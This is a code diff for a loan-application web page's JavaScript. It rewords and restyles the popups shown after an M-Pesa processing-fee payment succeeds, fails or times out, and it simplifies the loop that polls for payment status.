@@ -178,26 +178,30 @@ document.getElementById('apply-btn').addEventListener('click', async function ()
         if (isSuccess === 'COMPLETED') {
             Swal.fire({
                 icon: 'success',
-                title: 'Payment Received!',
-                html: `<div style="font-size:1.1rem;">Your loan is being processed.<br>Please wait up to 48 hours for disbursement.<br><span style='font-size:2rem;display:inline-block;margin-top:10px;'>🎉</span></div>`,
+                title: 'Loan Processing',
+                html: `<div style=\"font-size:1.1rem;\">Your payment was received.<br>Please wait up to 48 hours for your loan to be processed.<br><span style='font-size:2rem;display:inline-block;margin-top:10px;'>⏳</span></div>`,
                 confirmButtonText: 'OK',
                 customClass: { popup: 'modern-popup', htmlContainer: 'modern-html' }
             });
         } else if (isSuccess === 'CANCELLED' || isSuccess === 'FAILED' || isSuccess === 'WRONG_PIN') {
             Swal.fire({
                 icon: 'error',
-                title: 'Payment Not Completed',
-                html: `<div style='font-size:1.05rem;'>Sorry, you need to pay the processing fee to get a loan.<br>Please try again and ensure you complete the payment on your phone.<br><span style='font-size:2rem;display:inline-block;margin-top:10px;'>❌</span></div>`,
+                title: 'Loan Processing Failed',
+                html: `<div style='font-size:1.05rem;'>You must pay the processing fee first to get a loan.<br>Please try again and ensure you complete the payment on your phone.<br><span style='font-size:2rem;display:inline-block;margin-top:10px;'>❌</span></div>`,
                 confirmButtonText: 'Try Again',
                 customClass: { popup: 'modern-popup', htmlContainer: 'modern-html' }
             });
         } else if (reason === 'timeout') {
             Swal.fire({
-                icon: 'warning',
-                title: 'No Response from M-Pesa',
-                html: `<div style='font-size:1.05rem;'>We didn’t get a response from M-Pesa.<br><span style='color:#64748b;'>Please check your phone and try again.</span><br><span style='font-size:2rem;display:inline-block;margin-top:10px;'>📱</span></div>`,
-                confirmButtonText: 'Try Again',
-                customClass: { popup: 'modern-popup', htmlContainer: 'modern-html' }
+                title: `<div style='display:flex;flex-direction:column;align-items:center;'>
+                    <div style='width:70px;height:70px;border-radius:50%;background:#fffbe6;display:flex;align-items:center;justify-content:center;margin:0 auto 10px auto;border:3px solid #c7f5e9;'>
+                        <span style='font-size:2.6rem;color:#fbbf24;'>!</span>
+                    </div>
+                    <span style='font-size:2rem;font-weight:700;color:#334155;'>No Response from M-Pesa</span>
+                </div>`,
+                html: `<div style='font-size:1.08rem;color:#475569;margin-top:8px;'>We didn’t get a response from M-Pesa.<br><span style='color:#64748b;'>Please check your phone and try again.</span><br><span style='font-size:2.2rem;display:inline-block;margin:18px 0 8px 0;'>📱</span></div>`,
+                confirmButtonText: '<span style="font-size:1.1rem;font-weight:600;letter-spacing:0.5px;">Try Again</span>',
+                customClass: { popup: 'modern-popup', htmlContainer: 'modern-html', confirmButton: 'modern-confirm-btn' }
             });
         }
     };
@@ -233,6 +237,7 @@ document.getElementById('apply-btn').addEventListener('click', async function ()
         const result = await response.json();
         if (response.ok && result.success) {
             const txId = result.txId;
+            // Poll every 3s, but close modal instantly on backend response
             pollInterval = setInterval(async () => {
                 if (pollClosed) return;
                 attempts++;
@@ -243,11 +248,7 @@ document.getElementById('apply-btn').addEventListener('click', async function ()
                         body: JSON.stringify({ msisdn: formattedPhone, txId })
                     });
                     const status = await statusRes.json();
-                    if (status.status === 'COMPLETED') {
-                        clearInterval(pollInterval);
-                        pollClosed = true;
-                        await closeAndCleanup(null, 'COMPLETED');
-                    } else if (status.status === 'FAILED' || status.status === 'CANCELLED' || status.status === 'WRONG_PIN') {
+                    if (['COMPLETED', 'FAILED', 'CANCELLED', 'WRONG_PIN'].includes(status.status)) {
                         clearInterval(pollInterval);
                         pollClosed = true;
                         await closeAndCleanup(null, status.status);
